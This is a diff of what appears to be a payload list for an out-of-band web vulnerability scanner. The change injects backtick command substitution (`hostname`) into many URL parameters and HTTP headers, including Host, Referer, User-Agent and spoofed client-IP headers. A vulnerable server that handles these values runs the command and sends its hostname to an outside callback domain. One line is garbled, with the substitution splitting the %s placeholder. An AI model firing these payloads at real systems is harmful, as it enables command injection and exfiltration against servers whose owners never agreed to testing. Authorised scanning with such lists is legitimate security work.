@@ -1,45 +1,45 @@
 # Lines starting with # are ignored
-#param,u,http://%s/
-#param,href,http://%s/
-#param,action,http://%s/
-#param,host,%s
-#param,http_host,%s
-#param,email,root@%s
-#param,url,http://%s/
-#param,load,http://%s/
-#param,preview,http://%s/
-#param,target,http://%s/
-#param,proxy,http://%s/
-#param,from,http://%s/
-#param,src,http://%s/
-#param,ref,http://%s/
-#param,referrer,http://%s/
+#param,u,http://`hostname`.%s/
+#param,href,http://`hostname`.%s/
+#param,action,http://`hostname`.%s/
+#param,host,`hostname`.%s
+#param,http_host,%`hostname`.s
+#param,email,root@`hostname`.%s
+#param,url,http://`hostname`.%s/
+#param,load,http://`hostname`.%s/
+#param,preview,http://`hostname`.%s/
+#param,target,http://`hostname`.%s/
+#param,proxy,http://`hostname`.%s/
+#param,from,http://`hostname`.%s/
+#param,src,http://`hostname`.%s/
+#param,ref,http://`hostname`.%s/
+#param,referrer,http://`hostname`.%s/
 # %h is replaced with corresponding Host header
 # Useful in cases like Host, Origin, etc.
-#header,Host,%s:80@%h
-header,Contact,root@%s
-header,From,root@%s
-header,User-Agent,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@%s
-header,Referer,http://%s/ref
-#header,X-Original-URL,http://%s/
-header,X-Wap-Profile,http://%s/wap.xml
-#header,Profile,http://%s/wap.xml
-#header,X-Arbitrary,http://%s/
-#header,X-HTTP-DestinationURL,http://%s/
-#header,X-Forwarded-Proto,http://%s/
-#header,Origin,http://%s
-#header,X-Forwarded-Host,%s
-#header,X-Forwarded-Server,%s
-#header,X-Host,%s
-#header,Proxy-Host,%s
-#header,Destination,%s
-#header,Proxy,http://%s
-#header,Via,1.1 %s
-header,X-Forwarded-For,spoofed.%s
-header,True-Client-IP,spoofed.%s
-header,Client-IP,spoofed.%s
-header,X-Client-IP,spoofed.%s
-header,X-Real-IP,spoofed.%s
-header,X-Originating-IP,spoofed.%s
-header,CF-Connecting_IP,spoofed.%s
-header,Forwarded,for=spoofed.%s;by=spoofed.%s;host=spoofed.%s
+#header,Host,`hostname`.%s:80@%h
+header,Contact,root@`hostname`.%s
+header,From,root@`hostname`.%s
+header,User-Agent,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@`hostname`.%s
+header,Referer,http://`hostname`.%s/ref
+#header,X-Original-URL,http://`hostname`.%s/
+header,X-Wap-Profile,http://`hostname`.%s/wap.xml
+#header,Profile,http://`hostname`.%s/wap.xml
+#header,X-Arbitrary,http://`hostname`.%s/
+#header,X-HTTP-DestinationURL,http://`hostname`.%s/
+#header,X-Forwarded-Proto,http://`hostname`.%s/
+#header,Origin,http://`hostname`.%s
+#header,X-Forwarded-Host,`hostname`.%s
+#header,X-Forwarded-Server,`hostname`.%s
+#header,X-Host,`hostname`.%s
+#header,Proxy-Host,`hostname`.%s
+#header,Destination,`hostname`.%s
+#header,Proxy,http://`hostname`.%s
+#header,Via,1.1 `hostname`.%s
+header,X-Forwarded-For,spoofed.`hostname`.%s
+header,True-Client-IP,spoofed.`hostname`.%s
+header,Client-IP,spoofed.`hostname`.%s
+header,X-Client-IP,spoofed.`hostname`.%s
+header,X-Real-IP,spoofed.`hostname`.%s
+header,X-Originating-IP,spoofed.`hostname`.%s
+header,CF-Connecting_IP,spoofed.`hostname`.%s
+header,Forwarded,for=spoofed.`hostname`.%s;by=spoofed.`hostname`.%s;host=spoofed.`hostname`.%s
